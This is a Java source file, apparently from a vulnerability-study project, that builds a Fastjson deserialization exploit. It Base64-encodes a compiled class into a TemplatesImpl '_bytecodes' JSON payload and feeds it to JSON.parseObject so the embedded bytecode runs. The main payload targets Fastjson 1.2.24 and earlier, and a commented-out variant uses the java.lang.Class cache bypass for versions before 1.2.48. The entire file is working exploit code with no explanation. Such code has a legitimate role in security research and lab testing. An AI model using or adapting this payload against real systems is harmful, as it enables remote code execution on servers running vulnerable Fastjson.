package com.shiro.vuln.fastjson;
import java.io.*;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import java.util.Base64;

public class Fastjson02_TemplatesImpl {
    public static void main(String[] args) throws Exception {
		InputStream resourceAsStream = Fastjson02_TemplatesImpl.class.getResourceAsStream("TemplatesImplcmd.class");
		byte[] bs = new byte[resourceAsStream.available()];
		resourceAsStream.read(bs);
        String encodedBytes = Base64.getEncoder().encodeToString(bs);
        //<=1.2.24
     	String payload = "{\r\n"
     			+ "    \"a\": {\r\n"
     			+ "        \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \r\n"
     			+ "        \"_bytecodes\": [\r\n"
     			+ "            \""+encodedBytes+"\"\r\n"
     			+ "        ], \r\n"
     			+ "        \"_name\": \"aaa\", \r\n"
     			+ "        \"_tfactory\": { }, \r\n"
     			+ "        \"_outputProperties\": { }\r\n"
     			+ "    }\r\n"
     			+ "}";
        //<1.2.48
//     	payload = "{\r\n"
//     			+ "    \"a\": {\r\n"
//     			+ "        \"@type\": \"java.lang.Class\", \r\n"
//     			+ "        \"val\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\r\n"
//     			+ "    }, \r\n"
//     			+ "    \"b\": {\r\n"
//     			+ "        \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \r\n"
//     			+ "        \"_bytecodes\": [\r\n"
//     			+ "            \""+encodedBytes+"\"\r\n"
//     			+ "        ], \r\n"
//     			+ "        \"_name\": \"aaa\", \r\n"
//     			+ "        \"_tfactory\": { }, \r\n"
//     			+ "        \"_outputProperties\": { }\r\n"
//     			+ "    }\r\n"
//     			+ "}";
     	System.out.println(payload);
     	JSON.parseObject(payload, Feature.SupportNonPublicField);
     	
    }
}
